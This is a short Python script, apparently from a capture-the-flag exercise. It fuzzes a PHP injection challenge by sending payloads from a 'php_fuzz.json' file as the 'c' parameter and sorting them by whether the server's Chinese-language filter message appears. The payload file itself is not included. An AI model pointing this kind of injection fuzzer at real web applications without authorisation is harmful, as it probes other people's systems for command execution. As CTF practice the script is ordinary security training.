import string

import json

from requests_html import HTMLSession

url = 'http://632-09bcb4c2-da60-4791.nss.ctfer.vip:9080/'
cmd = 'c'
method = 'get'
exclude = '请不要输入奇奇怪怪'
s = HTMLSession()

work_lst = []
fuz_lst = []
def main():
    obj = init()
    for key, v, in obj.items():
        v = v + ';'
        if method == 'get':
            res = s.get(f'{url}?{cmd}={v}')
        else:
            res = s.post(url, data={cmd: v})

        if exclude and exclude in res.text:
            fuz_lst.append(key)
            continue
        work_lst.append(key)
        print(key.center(24, '-') + '\n',  res.text)



def init():
    jso = open('php_fuzz.json', 'r', encoding="utf-8").read()
    r = json.loads(jso)
    return r


if __name__ == '__main__':
    main()
    print('fuz list is ', fuz_lst)
    print('work list is ', work_lst)
